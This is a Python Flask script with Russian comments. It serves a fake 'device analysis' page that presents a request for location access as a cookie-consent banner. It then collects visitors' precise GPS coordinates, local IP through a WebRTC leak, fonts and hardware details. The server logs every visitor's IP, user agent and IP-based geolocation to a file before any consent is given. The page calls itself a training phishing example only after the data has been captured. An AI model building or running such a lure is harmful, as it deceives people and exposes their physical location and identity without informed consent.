from flask import Flask, request, render_template_string, make_response
import requests
from datetime import datetime
import re
import os
import json

app = Flask(__name__)

# Настройки
LOG_FILE = "user_data.log"  # Файл будет создаваться в текущей директории
COOKIE_NAME = "user_consent"

def init_log_file():
    """Инициализация файла логов"""
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.write("")  # Создаем пустой файл

def get_ip_data(ip):
    """Получение данных по IP"""
    if not ip or ip.startswith(('127.', '10.', '192.168.', '172.')):
        return {"country": "Локальная сеть", "city": "Локальная сеть", "org": "Локальная сеть"}
    
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

def parse_user_agent(user_agent):
    """Анализ User-Agent"""
    user_agent = user_agent or ""
    os_info = browser = "Неизвестно"
    
    # Определение ОС
    os_patterns = [
        ('Windows 11', r'Windows NT 10.0; Win64; x64'),
        ('Windows 10', r'Windows NT 10.0'),
        ('Linux', r'Linux'),
        ('Android', r'Android'),
        ('iOS', r'iPhone|iPad|iPod'),
        ('Mac OS X', r'Macintosh')
    ]
    
    # Определение браузера
    browser_patterns = [
        ('Chrome', r'Chrome|CriOS'),
        ('Firefox', r'Firefox|FxiOS'),
        ('Safari', r'Safari'),
        ('Edge', r'Edg'),
        ('Opera', r'Opera|OPR')
    ]

    for name, pattern in os_patterns:
        if re.search(pattern, user_agent):
            os_info = name
            break

    for name, pattern in browser_patterns:
        if re.search(pattern, user_agent):
            browser = name
            break

    device = "Смартфон/Планшет" if any(x in user_agent for x in ['Mobile', 'Android', 'iPhone']) else "Компьютер"

    return os_info, browser, device

def log_data(data):
    """Логирование данных"""
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(json.dumps(data, ensure_ascii=False) + '\n')
    except Exception as e:
        print(f"Ошибка записи в лог: {e}")

def delete_user_data(ip):
    """Удаление данных пользователя"""
    try:
        if not os.path.exists(LOG_FILE):
            return False

        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            lines = [line for line in f if json.loads(line).get('ip') != ip]

        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.writelines(lines)

        return True
    except Exception:
        return False

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Анализ устройства</title>
    <style>
        body {
            background-color: #111;
            color: #0f0;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.7);
            border-radius: 10px;
            padding: 20px;
            margin: 0 auto;
            max-width: 800px;
        }
        .info-block {
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333;
        }
        #cookieConsent {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #222;
            color: white;
            padding: 15px;
            text-align: center;
            z-index: 1000;
        }
        button {
            padding: 10px 20px;
            margin: 0 10px;
            border-radius: 5px;
            cursor: pointer;
        }
        .allow {
            background: #4CAF50;
            color: white;
            border: none;
        }
        .deny {
            background: #f44336;
            color: white;
            border: none;
        }
        #map {
            height: 300px;
            width: 100%;
            margin-top: 15px;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div id="mainContent" class="container" style="display:none;">
        <div class="info-block">
            <h2>🌍 Сеть и местоположение</h2>
            <p><strong>IP:</strong> <span id="ipField">{{ ip }}</span></p>
            <p><strong>Страна:</strong> <span id="countryField">{{ country }}</span></p>
            <p><strong>Город:</strong> <span id="cityField">{{ city }}</span></p>
            <p><strong>Провайдер:</strong> <span id="ispField">{{ isp }}</span></p>
            <div id="gpsData" style="display:none;">
                <p><strong>Координаты:</strong> <span id="coordinates"></span></p>
                <p><strong>Точность:</strong> <span id="accuracy"></span></p>
                <div id="map"></div>
            </div>
        </div>

        <div class="info-block">
            <h2>💻 Системная информация</h2>
            <p><strong>ОС:</strong> <span id="osField">{{ os }}</span></p>
            <p><strong>Браузер:</strong> <span id="browserField">{{ browser }}</span></p>
            <p><strong>Устройство:</strong> <span id="deviceField">{{ device }}</span></p>
            <p><strong>Ядра CPU:</strong> <span id="cpuCores"></span></p>
            <p><strong>Разрешение экрана:</strong> <span id="screenRes"></span></p>
        </div>

        <div class="info-block">
            <h2>🔌 Сетевые данные</h2>
            <p><strong>Локальный IP:</strong> <span id="localIp"></span></p>
            <p><strong>Доступные шрифты:</strong> <span id="fonts"></span></p>
        </div>

        <div style="color:#f55;margin-top:20px;">
            <h3>⚠️ Это учебный пример</h3>
            <p>Вы только что стали жертвой учебной фишинговой атаки.</p>
            <button onclick="deleteMyData()" class="deny">Удалить мои данные</button>
        </div>
    </div>

    <div id="cookieConsent">
        <h3>🍪 Использование Cookies</h3>
        <p>Для персонализации сервиса нам требуется доступ к данным о вашем местоположении.</p>
        <button class="allow" onclick="accept()">Разрешить</button>
        <button class="deny" onclick="reject()">Отклонить</button>
    </div>

    <script>
        // Проверка согласия на cookies
        function checkConsent() {
            return document.cookie.includes("{{ COOKIE_NAME }}=true");
        }

        // Принятие соглашения
        function accept() {
            // Устанавливаем куки
            document.cookie = "{{ COOKIE_NAME }}=true; max-age=31536000; path=/";
            document.getElementById('cookieConsent').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            
            // Запрашиваем геолокацию
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const coords = position.coords;
                        document.getElementById('coordinates').textContent = 
                            coords.latitude.toFixed(6) + ", " + coords.longitude.toFixed(6);
                        document.getElementById('accuracy').textContent = "±" + Math.round(coords.accuracy) + " метров";
                        document.getElementById('gpsData').style.display = 'block';
                        
                        // Отправка данных на сервер
                        fetch('/log_gps', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                lat: coords.latitude,
                                lon: coords.longitude,
                                acc: coords.accuracy
                            })
                        });
                        
                        // Показываем карту
                        showMap(coords.latitude, coords.longitude);
                    },
                    error => {
                        console.error("Ошибка геолокации:", error);
                    },
                    {enableHighAccuracy: true, timeout: 10000}
                );
            }
            
            // Загружаем дополнительную информацию
            loadDeviceInfo();
        }

        // Отклонение соглашения
        function reject() {
            alert("Некоторые функции будут недоступны");
            document.getElementById('cookieConsent').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            loadBasicInfo();
        }

        // Показать карту
        function showMap(lat, lon) {
            const map = document.getElementById('map');
            map.innerHTML = `
                <iframe width="100%" height="100%" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"
                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&amp;layer=mapnik&amp;marker=${lat}%2C${lon}">
                </iframe>`;
        }

        // Загрузка информации об устройстве
        function loadDeviceInfo() {
            // Информация о процессоре
            document.getElementById('cpuCores').textContent = navigator.hardwareConcurrency || "Неизвестно";
            
            // Разрешение экрана
            document.getElementById('screenRes').textContent = 
                window.screen.width + "×" + window.screen.height;
            
            // Локальный IP через WebRTC
            getLocalIP();
            
            // Доступные шрифты
            getFonts();
        }

        // Базовая информация (без доступа к геолокации)
        function loadBasicInfo() {
            document.getElementById('cpuCores').textContent = "Требуется согласие";
            document.getElementById('screenRes').textContent = 
                window.screen.width + "×" + window.screen.height;
        }

        // Получение локального IP
        function getLocalIP() {
            try {
                const rtc = new RTCPeerConnection({iceServers: []});
                rtc.createDataChannel("");
                rtc.onicecandidate = e => {
                    if (e.candidate) {
                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ip) {
                            document.getElementById('localIp').textContent = ip[1];
                            rtc.close();
                        }
                    }
                };
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            } catch (e) {
                console.error("WebRTC не поддерживается:", e);
                document.getElementById('localIp').textContent = "Недоступно";
            }
        }

        // Получение списка шрифтов
        function getFonts() {
            const fonts = ["Arial", "Times New Roman", "Courier New", "Verdana", "Georgia"];
            const available = [];
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            
            fonts.forEach(font => {
                ctx.font = `12px "${font}"`;
                if (ctx.measureText("test").width > 0) available.push(font);
            });
            
            document.getElementById('fonts').textContent = available.join(", ") || "Неизвестно";
        }

        // Удаление данных пользователя
        function deleteMyData() {
            fetch('/delete_data', {method: 'POST'})
                .then(response => response.json())
                .then(data => {
                    alert(data.success ? "Данные удалены!" : "Ошибка удаления");
                })
                .catch(e => {
                    console.error("Ошибка:", e);
                    alert("Ошибка при удалении данных");
                });
        }

        // Проверяем согласие при загрузке страницы
        if (checkConsent()) {
            document.getElementById('cookieConsent').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            loadDeviceInfo();
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    try:
        # Получаем реальный IP
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip = ip.split(',')[0].strip() if ip else request.remote_addr
        
        # Получаем данные пользователя
        user_agent = request.headers.get('User-Agent', '')
        geo = get_ip_data(ip) or {}
        os_info, browser, device = parse_user_agent(user_agent)
        
        # Логируем базовые данные
        log_data({
            "time": datetime.now().isoformat(),
            "ip": ip,
            "user_agent": user_agent,
            "os": os_info,
            "browser": browser,
            "device": device,
            "geo": geo
        })

        # Рендерим страницу
        return render_template_string(
            HTML_TEMPLATE,
            COOKIE_NAME=COOKIE_NAME,
            ip=ip,
            country=geo.get('country', 'Неизвестно'),
            city=geo.get('city', 'Неизвестно'),
            isp=geo.get('org', 'Неизвестно'),
            os=os_info,
            browser=browser,
            device=device
        )
    except Exception as e:
        print(f"Ошибка в index: {e}")
        return "Произошла ошибка", 500

@app.route('/log_gps', methods=['POST'])
def log_gps():
    try:
        data = request.json
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip = ip.split(',')[0].strip() if ip else request.remote_addr
        
        log_data({
            "time": datetime.now().isoformat(),
            "ip": ip,
            "gps": data
        })
        
        return {"status": "success"}
    except Exception as e:
        print(f"Ошибка в log_gps: {e}")
        return {"status": "error"}, 500

@app.route('/delete_data', methods=['POST'])
def delete_data():
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip = ip.split(',')[0].strip() if ip else request.remote_addr
        
        return {"success": delete_user_data(ip)}
    except Exception as e:
        print(f"Ошибка в delete_data: {e}")
        return {"success": False}, 500

if __name__ == '__main__':
    try:
        # Инициализируем файл логов
        init_log_file()
        
        # Запускаем сервер
        app.run(host='0.0.0.0', port=5000, debug=False)
    except Exception as e:
        print(f"Ошибка запуска сервера: {e}")
